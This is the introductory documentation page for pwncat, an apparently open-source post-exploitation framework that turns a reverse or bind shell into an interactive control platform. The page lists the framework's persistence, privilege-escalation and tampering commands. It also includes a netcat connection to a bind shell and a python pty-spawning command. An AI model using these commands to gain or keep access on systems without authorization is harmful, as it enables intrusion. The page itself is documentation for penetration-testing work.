.. pwncat documentation master file, created by
   sphinx-quickstart on Mon May 18 01:30:55 2020.
   You can adapt this file completely to your liking, but it should at least
   contain the root `toctree` directive.

pwncat - living off the land... in style!
=========================================

pwncat is a command and control framework which turns a basic reverse or bind
shell into a fully-featured exploitation platform. After initial connection, the
framework will probe the remote system to identify useful binaries natively
available on the target system. It will then attempt to start a pseudoterminal
on the remote host and provide you with raw terminal access.

pwncat doesn't stop there, though. On top of raw terminal access, pwncat can
programmatically interact with the remote host alongside your terminal access.
pwncat provides you with a local shell interface which can utilize your
connection for enumeration, file upload/download, automatic persistence
installation and even automated privilege escalation.

What's wrong with just a reverse shell?
---------------------------------------

You may be familiar with the common method of getting raw terminal access with
reverse shells. It normally goes something like this:

.. code-block:: bash
    
    # Connect to a remote bind shell
    nc 1.1.1.1 4444
    # Spawn a remote pseudoterminal
    remote$ python -c "import pty; pty.spawn('/bin/bash')"
    # Background your raw shell
    remote$ C-z
    # Set local terminal to raw mode
    local$ stty raw -echo
    # Foreground your remote shell
    local$ fg
    # You now have a full terminal that doesn't exit on C-c
    remote$

This works well. However, the added steps to get a reverse shell are laborious
after a while. Also, the danger of losing your remote shell by accidentally
pressing "C-c" prior to gaining raw access is high. This was the original
inspiration of this project.

Starting-up pwncat
------------------

.. code-block:: bash

    usage: pwncat [-h] (--reverse | --bind) [--host HOST] --port PORT
                  [--method {script-util-linux,script-other,python}] [--config CONFIG]

    optional arguments:
      -h, --help            show this help message and exit
      --reverse, -r         Listen on the specified port for connections from a remote host
      --bind, -b            Connect to a remote host
      --host HOST, -H HOST  Bind address for reverse connections. Remote host for bind connections (default:
                            0.0.0.0)
      --port PORT, -p PORT  Bind port for reverse connections. Remote port for bind connections
      --method {script-util-linux,script-other,python}, -m {script-util-linux,script-other,python}
                            Method to create a pty on the remote host (default: script)
      --config CONFIG, -c CONFIG
                            Configuration script

pwncat can be started in two different modes: bind or reverse. These are named
after the type of connection from the perspective of the victim host. In
bind-mode, pwncat connects to a remote bind shell, while in reverse-mode pwncat
listens for a reverse shell connection from a remote host. To start shell in
reverse mode, you can use the following command:

.. code-block:: bash

    $ pwncat -r -H 0.0.0.0 -p 4444
    [+] binding to 0.0.0.0:4444

Upon receiving a connection, pwncat will immediately begin probing the remote
system to identify important information. After figuring out what type of system
it is controlling, pwncat will give you your shell:

.. code-block:: bash

    [+] setting terminal prompt
    [+] running in /bin/bash
    [+] terminal state synchronized
    [+] pwncat is ready 🐈

    (remote) caleb@stewie-xps:~/Development/pwncat$

pwncat will always ensure the remote prompt is set in such a way that it is
easily recognizable with the red "(remote)" prefix.

At it's core, pwncat provides synchronized raw terminal access. pwncat will
synchronize the remote pty width, height and terminal type (``TERM`` environment
variable) with the local host. This allows you to not only use the history,
arrow keys, and keyboard shortcuts you are used to but also use graphical
terminal applications like ``vim`` or ``nano`` seamlessly. 

After getting to the raw terminal prompt, you can get to the pwncat prompt by
pressing ``C-d``. pwncat works by intercepting certain control sequences being
sent to the remote host. ``C-d`` will always be intercepted and used to
transistion to or from the remote prompt.

.. code-block:: bash

    (remote) caleb@stewie-xps:~/Development/pwncat$ (C-d)
    [+] local terminal restored
    (local) pwncat$ help
    [+] the following commands are available:
     * alias
     * back
     * bind
     * busybox
     * download
     * help
     * local
     * persist
     * privesc
     * run
     * set
     * shortcut
     * sync
     * tamper
     * upload
    (local) pwncat$

Other keyboard shortcuts can be accessed via the defined "prefix" (much like in
``tmux``). The default prefix is ``C-k``, however this can be changed in the
configuration file. To send ``C-d`` to the remote process, you can preceed the
``C-d`` with your prefix (by default: ``C-k C-d`` will send ``C-d`` to the
remote process). This prevents accidental closing of your remote terminal, and
also provides easy transition between pwncat and remote prompts. To send your
prefix to the remote process, you can press it twice. For example, to send the
default prefix, you can press ``C-k C-k``.

From here, take a look at the individual documentation sections for different
features.

.. toctree::
    :maxdepth: -1
    :caption: Contents:

    installation.rst
    configuration.rst
    upload.rst
    download.rst
    tamper.rst
    privesc.rst
    persist.rst
    api/index.rst

Indices and tables
==================

* :ref:`genindex`
* :ref:`modindex`
* :ref:`search`
